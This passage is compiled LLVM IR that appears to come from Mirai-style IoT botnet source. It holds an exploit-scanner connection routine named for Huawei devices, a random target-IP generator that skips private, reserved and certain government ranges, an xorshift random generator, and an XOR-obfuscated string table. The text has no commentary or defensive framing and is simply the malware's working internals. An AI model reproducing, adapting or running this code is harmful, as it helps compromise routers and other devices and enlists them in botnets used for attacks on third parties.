  %664 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %663, i32 0, i32 5
  %665 = load i32, i32* %664, align 4
  %666 = sub nsw i32 256, %665
  %667 = call i32 @huawei_recv_strip_null(i32 noundef %654, i8* noundef %662, i32 noundef %666, i32 noundef 16384)
  store i32 %667, i32* %32, align 4
  %668 = load i32, i32* %32, align 4
  %669 = icmp eq i32 %668, 0
  br i1 %669, label %670, label %672

670:                                              ; preds = %650
  %671 = call i32* @__errno_location() #10
  store i32 104, i32* %671, align 4
  store i32 -1, i32* %32, align 4
  br label %672

672:                                              ; preds = %670, %650
  %673 = load i32, i32* %32, align 4
  %674 = icmp eq i32 %673, -1
  br i1 %674, label %675, label %707

675:                                              ; preds = %672
  %676 = call i32* @__errno_location() #10
  %677 = load i32, i32* %676, align 4
  %678 = icmp ne i32 %677, 11
  br i1 %678, label %679, label %706

679:                                              ; preds = %675
  %680 = call i32* @__errno_location() #10
  %681 = load i32, i32* %680, align 4
  %682 = icmp ne i32 %681, 11
  br i1 %682, label %683, label %706

683:                                              ; preds = %679
  %684 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %685 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %684, i32 0, i32 2
  %686 = load i32, i32* %685, align 8
  %687 = icmp eq i32 %686, 3
  br i1 %687, label %688, label %694

688:                                              ; preds = %683
  %689 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %690 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %689, i32 0, i32 0
  %691 = load i32, i32* %690, align 8
  %692 = call i32 @close(i32 noundef %691)
  %693 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  call void @huawei_setup_connection(%struct.exploit_scanner_connection* noundef %693)
  br label %627

694:                                              ; preds = %683
  %695 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %696 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %695, i32 0, i32 0
  %697 = load i32, i32* %696, align 8
  %698 = call i32 @close(i32 noundef %697)
  %699 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %700 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %699, i32 0, i32 0
  store i32 -1, i32* %700, align 8
  %701 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %702 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %701, i32 0, i32 2
  store i32 0, i32* %702, align 8
  %703 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %704 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %703, i32 0, i32 6
  %705 = getelementptr inbounds [256 x i8], [256 x i8]* %704, i64 0, i64 0
  call void @util_zero(i8* noundef %705, i32 noundef 256)
  br label %706

706:                                              ; preds = %694, %679, %675
  br label %725

707:                                              ; preds = %672
  %708 = load i32, i32* %32, align 4
  %709 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %710 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %709, i32 0, i32 5
  %711 = load i32, i32* %710, align 4
  %712 = add nsw i32 %711, %708
  store i32 %712, i32* %710, align 4
  %713 = load i32, i32* @huawei_fake_time, align 4
  %714 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %715 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %714, i32 0, i32 1
  store i32 %713, i32* %715, align 4
  %716 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %717 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %716, i32 0, i32 6
  %718 = getelementptr inbounds [256 x i8], [256 x i8]* %717, i64 0, i64 0
  %719 = call i32 @util_strlen(i8* noundef %718)
  store i32 %719, i32* %33, align 4
  %720 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %721 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %720, i32 0, i32 6
  %722 = load i32, i32* %33, align 4
  %723 = sext i32 %722 to i64
  %724 = getelementptr inbounds [256 x i8], [256 x i8]* %721, i64 0, i64 %723
  store i8 0, i8* %724, align 1
  br label %627

725:                                              ; preds = %706, %632
  br label %726

726:                                              ; preds = %725, %609
  br label %727

727:                                              ; preds = %726, %599, %585, %555, %521
  %728 = load i32, i32* %1, align 4
  %729 = add nsw i32 %728, 1
  store i32 %729, i32* %1, align 4
  br label %509, !llvm.loop !41

730:                                              ; preds = %509
  br label %137
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @get_random_ip.76() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i8, align 1
  %4 = alloca i8, align 1
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i32, align 4
  store i8 0, i8* %3, align 1
  store i8 0, i8* %4, align 1
  store i8 0, i8* %5, align 1
  store i8 0, i8* %6, align 1
  br label %8

8:                                                ; preds = %165, %0
  %9 = call i32 @rand_next()
  store i32 %9, i32* %2, align 4
  %10 = call i64 @time(i64* noundef null) #11
  %11 = trunc i64 %10 to i32
  call void @srand(i32 noundef %11) #11
  %12 = load i32, i32* %2, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %3, align 1
  %15 = load i32, i32* %2, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %4, align 1
  %19 = load i32, i32* %2, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %5, align 1
  %23 = load i32, i32* %2, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %6, align 1
  br label %27

27:                                               ; preds = %8
  %28 = load i8, i8* %3, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 127
  br i1 %30, label %165, label %31

31:                                               ; preds = %27
  %32 = load i8, i8* %3, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 0
  br i1 %34, label %165, label %35

35:                                               ; preds = %31
  %36 = load i8, i8* %3, align 1
  %37 = zext i8 %36 to i32
  %38 = icmp eq i32 %37, 3
  br i1 %38, label %165, label %39

39:                                               ; preds = %35
  %40 = load i8, i8* %3, align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %41, 15
  br i1 %42, label %165, label %43

43:                                               ; preds = %39
  %44 = load i8, i8* %3, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp eq i32 %45, 16
  br i1 %46, label %165, label %47

47:                                               ; preds = %43
  %48 = load i8, i8* %3, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 56
  br i1 %50, label %165, label %51

51:                                               ; preds = %47
  %52 = load i8, i8* %3, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 10
  br i1 %54, label %165, label %55

55:                                               ; preds = %51
  %56 = load i8, i8* %3, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %57, 192
  br i1 %58, label %59, label %63

59:                                               ; preds = %55
  %60 = load i8, i8* %4, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp eq i32 %61, 168
  br i1 %62, label %165, label %63

63:                                               ; preds = %59, %55
  %64 = load i8, i8* %3, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 172
  br i1 %66, label %67, label %75

67:                                               ; preds = %63
  %68 = load i8, i8* %4, align 1
  %69 = zext i8 %68 to i32
  %70 = icmp sge i32 %69, 16
  br i1 %70, label %71, label %75

71:                                               ; preds = %67
  %72 = load i8, i8* %4, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp slt i32 %73, 32
  br i1 %74, label %165, label %75

75:                                               ; preds = %71, %67, %63
  %76 = load i8, i8* %3, align 1
  %77 = zext i8 %76 to i32
  %78 = icmp eq i32 %77, 100
  br i1 %78, label %79, label %87

79:                                               ; preds = %75
  %80 = load i8, i8* %4, align 1
  %81 = zext i8 %80 to i32
  %82 = icmp sge i32 %81, 64
  br i1 %82, label %83, label %87

83:                                               ; preds = %79
  %84 = load i8, i8* %4, align 1
  %85 = zext i8 %84 to i32
  %86 = icmp slt i32 %85, 127
  br i1 %86, label %165, label %87

87:                                               ; preds = %83, %79, %75
  %88 = load i8, i8* %3, align 1
  %89 = zext i8 %88 to i32
  %90 = icmp eq i32 %89, 169
  br i1 %90, label %91, label %95

91:                                               ; preds = %87
  %92 = load i8, i8* %4, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp sgt i32 %93, 254
  br i1 %94, label %165, label %95

95:                                               ; preds = %91, %87
  %96 = load i8, i8* %3, align 1
  %97 = zext i8 %96 to i32
  %98 = icmp eq i32 %97, 198
  br i1 %98, label %99, label %107

99:                                               ; preds = %95
  %100 = load i8, i8* %4, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp sge i32 %101, 18
  br i1 %102, label %103, label %107

103:                                              ; preds = %99
  %104 = load i8, i8* %4, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp slt i32 %105, 20
  br i1 %106, label %165, label %107

107:                                              ; preds = %103, %99, %95
  %108 = load i8, i8* %3, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp sge i32 %109, 224
  br i1 %110, label %165, label %111

111:                                              ; preds = %107
  %112 = load i8, i8* %3, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp eq i32 %113, 6
  br i1 %114, label %163, label %115

115:                                              ; preds = %111
  %116 = load i8, i8* %3, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 7
  br i1 %118, label %163, label %119

119:                                              ; preds = %115
  %120 = load i8, i8* %3, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 11
  br i1 %122, label %163, label %123

123:                                              ; preds = %119
  %124 = load i8, i8* %3, align 1
  %125 = zext i8 %124 to i32
  %126 = icmp eq i32 %125, 21
  br i1 %126, label %163, label %127

127:                                              ; preds = %123
  %128 = load i8, i8* %3, align 1
  %129 = zext i8 %128 to i32
  %130 = icmp eq i32 %129, 22
  br i1 %130, label %163, label %131

131:                                              ; preds = %127
  %132 = load i8, i8* %3, align 1
  %133 = zext i8 %132 to i32
  %134 = icmp eq i32 %133, 26
  br i1 %134, label %163, label %135

135:                                              ; preds = %131
  %136 = load i8, i8* %3, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 28
  br i1 %138, label %163, label %139

139:                                              ; preds = %135
  %140 = load i8, i8* %3, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 29
  br i1 %142, label %163, label %143

143:                                              ; preds = %139
  %144 = load i8, i8* %3, align 1
  %145 = zext i8 %144 to i32
  %146 = icmp eq i32 %145, 30
  br i1 %146, label %163, label %147

147:                                              ; preds = %143
  %148 = load i8, i8* %3, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp eq i32 %149, 33
  br i1 %150, label %163, label %151

151:                                              ; preds = %147
  %152 = load i8, i8* %3, align 1
  %153 = zext i8 %152 to i32
  %154 = icmp eq i32 %153, 55
  br i1 %154, label %163, label %155

155:                                              ; preds = %151
  %156 = load i8, i8* %3, align 1
  %157 = zext i8 %156 to i32
  %158 = icmp eq i32 %157, 214
  br i1 %158, label %163, label %159

159:                                              ; preds = %155
  %160 = load i8, i8* %3, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 215
  br label %163

163:                                              ; preds = %159, %155, %151, %147, %143, %139, %135, %131, %127, %123, %119, %115, %111
  %164 = phi i1 [ true, %155 ], [ true, %151 ], [ true, %147 ], [ true, %143 ], [ true, %139 ], [ true, %135 ], [ true, %131 ], [ true, %127 ], [ true, %123 ], [ true, %119 ], [ true, %115 ], [ true, %111 ], [ %162, %159 ]
  br label %165

165:                                              ; preds = %163, %107, %103, %91, %83, %71, %59, %51, %47, %43, %39, %35, %31, %27
  %166 = phi i1 [ true, %107 ], [ true, %103 ], [ true, %91 ], [ true, %83 ], [ true, %71 ], [ true, %59 ], [ true, %51 ], [ true, %47 ], [ true, %43 ], [ true, %39 ], [ true, %35 ], [ true, %31 ], [ true, %27 ], [ %164, %163 ]
  br i1 %166, label %8, label %167, !llvm.loop !42

167:                                              ; preds = %165
  %168 = call i32 @rand() #11
  %169 = srem i32 %168, 3
  store i32 %169, i32* %7, align 4
  %170 = load i32, i32* %7, align 4
  %171 = icmp eq i32 %170, 0
  br i1 %171, label %172, label %186

172:                                              ; preds = %167
  %173 = load i8, i8* %4, align 1
  %174 = zext i8 %173 to i32
  %175 = shl i32 %174, 16
  %176 = or i32 -1677721600, %175
  %177 = load i8, i8* %5, align 1
  %178 = zext i8 %177 to i32
  %179 = shl i32 %178, 8
  %180 = or i32 %176, %179
  %181 = load i8, i8* %6, align 1
  %182 = zext i8 %181 to i32
  %183 = shl i32 %182, 0
  %184 = or i32 %180, %183
  %185 = call i32 @htonl(i32 noundef %184) #10
  store i32 %185, i32* %1, align 4
  br label %240

186:                                              ; preds = %167
  %187 = load i32, i32* %7, align 4
  %188 = icmp eq i32 %187, 1
  br i1 %188, label %189, label %203

189:                                              ; preds = %186
  %190 = load i8, i8* %4, align 1
  %191 = zext i8 %190 to i32
  %192 = shl i32 %191, 16
  %193 = or i32 -989855744, %192
  %194 = load i8, i8* %5, align 1
  %195 = zext i8 %194 to i32
  %196 = shl i32 %195, 8
  %197 = or i32 %193, %196
  %198 = load i8, i8* %6, align 1
  %199 = zext i8 %198 to i32
  %200 = shl i32 %199, 0
  %201 = or i32 %197, %200
  %202 = call i32 @htonl(i32 noundef %201) #10
  store i32 %202, i32* %1, align 4
  br label %240

203:                                              ; preds = %186
  %204 = load i32, i32* %7, align 4
  %205 = icmp eq i32 %204, 2
  br i1 %205, label %206, label %220

206:                                              ; preds = %203
  %207 = load i8, i8* %4, align 1
  %208 = zext i8 %207 to i32
  %209 = shl i32 %208, 16
  %210 = or i32 687865856, %209
  %211 = load i8, i8* %5, align 1
  %212 = zext i8 %211 to i32
  %213 = shl i32 %212, 8
  %214 = or i32 %210, %213
  %215 = load i8, i8* %6, align 1
  %216 = zext i8 %215 to i32
  %217 = shl i32 %216, 0
  %218 = or i32 %214, %217
  %219 = call i32 @htonl(i32 noundef %218) #10
  store i32 %219, i32* %1, align 4
  br label %240

220:                                              ; preds = %203
  %221 = load i32, i32* %7, align 4
  %222 = icmp eq i32 %221, 3
  br i1 %222, label %223, label %240

223:                                              ; preds = %220
  %224 = load i8, i8* %3, align 1
  %225 = zext i8 %224 to i32
  %226 = shl i32 %225, 24
  %227 = load i8, i8* %4, align 1
  %228 = zext i8 %227 to i32
  %229 = shl i32 %228, 16
  %230 = or i32 %226, %229
  %231 = load i8, i8* %5, align 1
  %232 = zext i8 %231 to i32
  %233 = shl i32 %232, 8
  %234 = or i32 %230, %233
  %235 = load i8, i8* %6, align 1
  %236 = zext i8 %235 to i32
  %237 = shl i32 %236, 0
  %238 = or i32 %234, %237
  %239 = call i32 @htonl(i32 noundef %238) #10
  store i32 %239, i32* %1, align 4
  br label %240

240:                                              ; preds = %223, %220, %206, %189, %172
  %241 = load i32, i32* %1, align 4
  ret i32 %241
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @huawei_setup_connection(%struct.exploit_scanner_connection* noundef %0) #0 {
  %2 = alloca %struct.exploit_scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.exploit_scanner_connection* %0, %struct.exploit_scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %5, i8 0, i64 16, i1 false)
  %6 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %6, i32 0, i32 0
  %8 = load i32, i32* %7, align 8
  %9 = icmp ne i32 %8, -1
  br i1 %9, label %10, label %15

10:                                               ; preds = %1
  %11 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %12 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %11, i32 0, i32 0
  %13 = load i32, i32* %12, align 8
  %14 = call i32 @close(i32 noundef %13)
  br label %15

15:                                               ; preds = %10, %1
  %16 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #11
  %17 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %18 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %17, i32 0, i32 0
  store i32 %16, i32* %18, align 8
  %19 = icmp eq i32 %16, -1
  br i1 %19, label %20, label %21

20:                                               ; preds = %15
  br label %71

21:                                               ; preds = %15
  %22 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %23 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %22, i32 0, i32 5
  store i32 0, i32* %23, align 4
  %24 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %25 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %24, i32 0, i32 6
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %25, i64 0, i64 0
  call void @util_zero(i8* noundef %26, i32 noundef 256)
  %27 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %28 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %27, i32 0, i32 0
  %29 = load i32, i32* %28, align 8
  %30 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %31 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %30, i32 0, i32 0
  %32 = load i32, i32* %31, align 8
  %33 = call i32 (i32, i32, ...) @fcntl(i32 noundef %32, i32 noundef 3, i32 noundef 0)
  %34 = or i32 2048, %33
  %35 = call i32 (i32, i32, ...) @fcntl(i32 noundef %29, i32 noundef 4, i32 noundef %34)
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %38 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %37, i32 0, i32 3
  %39 = load i32, i32* %38, align 4
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %41 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %40, i32 0, i32 0
  store i32 %39, i32* %41, align 4
  %42 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %43 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %42, i32 0, i32 4
  %44 = load i16, i16* %43, align 8
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %44, i16* %45, align 2
  %46 = load i32, i32* @huawei_fake_time, align 4
  %47 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %48 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %47, i32 0, i32 1
  store i32 %46, i32* %48, align 4
  %49 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %50 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %49, i32 0, i32 2
  %51 = load i32, i32* %50, align 8
  %52 = icmp eq i32 %51, 3
  br i1 %52, label %58, label %53

53:                                               ; preds = %21
  %54 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %55 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %54, i32 0, i32 2
  %56 = load i32, i32* %55, align 8
  %57 = icmp eq i32 %56, 4
  br i1 %57, label %58, label %59

58:                                               ; preds = %53, %21
  br label %62

59:                                               ; preds = %53
  %60 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %61 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %60, i32 0, i32 2
  store i32 1, i32* %61, align 8
  br label %62

62:                                               ; preds = %59, %58
  %63 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %64 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %63, i32 0, i32 0
  %65 = load i32, i32* %64, align 8
  %66 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %67 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %67, %struct.sockaddr** %66, align 8
  %68 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %69 = load %struct.sockaddr*, %struct.sockaddr** %68, align 8
  %70 = call i32 @connect(i32 noundef %65, %struct.sockaddr* %69, i32 noundef 16)
  br label %71

71:                                               ; preds = %62, %20
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @huawei_recv_strip_null(i32 noundef %0, i8* noundef %1, i32 noundef %2, i32 noundef %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 noundef %11, i8* noundef %12, i64 noundef %14, i32 noundef %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %43

20:                                               ; preds = %4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %21

21:                                               ; preds = %39, %20
  %22 = load i32, i32* %10, align 4
  %23 = load i32, i32* %9, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %42

25:                                               ; preds = %21
  %26 = load i8*, i8** %6, align 8
  %27 = load i32, i32* %10, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %38

33:                                               ; preds = %25
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  store i8 65, i8* %37, align 1
  br label %38

38:                                               ; preds = %33, %25
  br label %39

39:                                               ; preds = %38
  %40 = load i32, i32* %10, align 4
  %41 = add nsw i32 %40, 1
  store i32 %41, i32* %10, align 4
  br label %21, !llvm.loop !43

42:                                               ; preds = %21
  br label %43

43:                                               ; preds = %42, %4
  %44 = load i32, i32* %9, align 4
  ret i32 %44
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @rand_init() #0 {
  %1 = call i64 @time(i64* noundef null) #11
  %2 = trunc i64 %1 to i32
  store i32 %2, i32* @x, align 4
  %3 = call i32 @getpid() #11
  %4 = call i32 @getppid() #11
  %5 = xor i32 %3, %4
  store i32 %5, i32* @y, align 4
  %6 = call i64 @clock() #11
  %7 = trunc i64 %6 to i32
  store i32 %7, i32* @z, align 4
  %8 = load i32, i32* @z, align 4
  %9 = load i32, i32* @y, align 4
  %10 = xor i32 %8, %9
  store i32 %10, i32* @w, align 4
  ret void
}

; Function Attrs: nounwind
declare i32 @getppid() #2

; Function Attrs: nounwind
declare i64 @clock() #2

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @table_init() #0 {
  call void @add_entry(i8 noundef zeroext 1, i8* noundef getelementptr inbounds ([15 x i8], [15 x i8]* @.str.84, i64 0, i64 0), i32 noundef 14)
  call void @add_entry(i8 noundef zeroext 2, i8* noundef getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1.85, i64 0, i64 0), i32 noundef 19)
  call void @add_entry(i8 noundef zeroext 3, i8* noundef getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2.86, i64 0, i64 0), i32 noundef 23)
  call void @add_entry(i8 noundef zeroext 4, i8* noundef getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3.87, i64 0, i64 0), i32 noundef 24)
  call void @add_entry(i8 noundef zeroext 5, i8* noundef getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4.88, i64 0, i64 0), i32 noundef 15)
  call void @add_entry(i8 noundef zeroext 6, i8* noundef getelementptr inbounds ([23 x i8], [23 x i8]* @.str.5.89, i64 0, i64 0), i32 noundef 22)
  call void @add_entry(i8 noundef zeroext 7, i8* noundef getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6.90, i64 0, i64 0), i32 noundef 15)
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @add_entry(i8 noundef zeroext %0, i8* noundef %1, i32 noundef %2) #0 {
  %4 = alloca i8, align 1
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store i8 %0, i8* %4, align 1
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load i32, i32* %6, align 4
  %9 = sext i32 %8 to i64
  %10 = call noalias i8* @malloc(i64 noundef %9) #11
  store i8* %10, i8** %7, align 8
  %11 = load i8*, i8** %7, align 8
  %12 = load i8*, i8** %5, align 8
  %13 = load i32, i32* %6, align 4
  call void @util_memcpy(i8* noundef %11, i8* noundef %12, i32 noundef %13)
  %14 = load i8*, i8** %7, align 8
  %15 = load i8, i8* %4, align 1
  %16 = zext i8 %15 to i64
  %17 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %16
  %18 = getelementptr inbounds %struct.table_value, %struct.table_value* %17, i32 0, i32 0
  store i8* %14, i8** %18, align 16
  %19 = load i32, i32* %6, align 4
  %20 = trunc i32 %19 to i16
  %21 = load i8, i8* %4, align 1
  %22 = zext i8 %21 to i64
  %23 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %22
  %24 = getelementptr inbounds %struct.table_value, %struct.table_value* %23, i32 0, i32 1
  store i16 %20, i16* %24, align 8
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @table_unlock_val(i8 noundef zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 noundef zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @toggle_obf(i8 noundef zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
